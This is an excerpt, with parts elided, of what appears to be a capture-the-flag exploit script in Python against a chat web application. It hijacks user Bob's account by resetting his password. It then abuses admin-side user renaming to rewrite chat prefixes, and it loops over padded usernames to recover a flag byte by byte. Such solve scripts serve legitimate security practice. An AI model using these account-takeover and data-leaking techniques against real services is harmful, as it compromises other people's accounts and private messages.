...
def hijack_bob(password="hacker_pass"):
    """
    Hijacks Bob's account to access the chat history.
    """
    ...
    # Change password to maintain access
    r = s.post(
        f"{BASE_URL}/user/bob/modify", data={"username": "bob", "password": password}
    )
    ...
    if "User modified" in r.text:
        ...
        log("Failed to hijack Bob.", "ERROR")
        sys.exit(1)
...
def normalize_chat_prefixes(admin_s, bob_pass, sharon_user):
    """
    Ensures both the Flag message and our Guess messages start with 'bob: '
    Requires ADMIN session to rename users.
    """
    log("Normalizing chat prefixes...", "SETUP")

    # 1. Rename 'bob' -> 'sharon_user'
    # Server rewrites 'bob: ...' lines to 'sharon_user: ...'
    r1 = admin_s.post(
        f"{BASE_URL}/user/bob/modify",
        data={"username": sharon_user, "password": bob_pass},
    )
    if "must be an admin" in r1.text or r1.status_code == 403:
        log("Admin check failed during normalization step 1.", "ERROR")

    # 2. Rename 'sharon_user' -> 'bob'
    # Server rewrites ALL lines starting with 'sharon_user: ' to 'bob: '
    # This includes the original flag message which was 'sharon_user: The flag...'
    r2 = admin_s.post(
        f"{BASE_URL}/user/{sharon_user}/modify",
        data={"username": "bob", "password": bob_pass},
    )
    if "User does not exist" in r2.text:
        log("Failed to rename sharon back to bob. Did step 1 succeed?", "ERROR")
...
def reset_attacker_account(admin_sess, username, password):
    admin_sess.post(
        f"{BASE_URL}/user/{username}/modify", data={"delete": "Delete User"}
    )
    requests.post(
        f"{BASE_URL}/register", data={"username": username, "password": password}
    )
...
def attack():
    ...
    while b"}" not in recovered:
        ...
        admin_s.post(
            ...
            data={"username": padded_username, "password": bob_pass},
        )
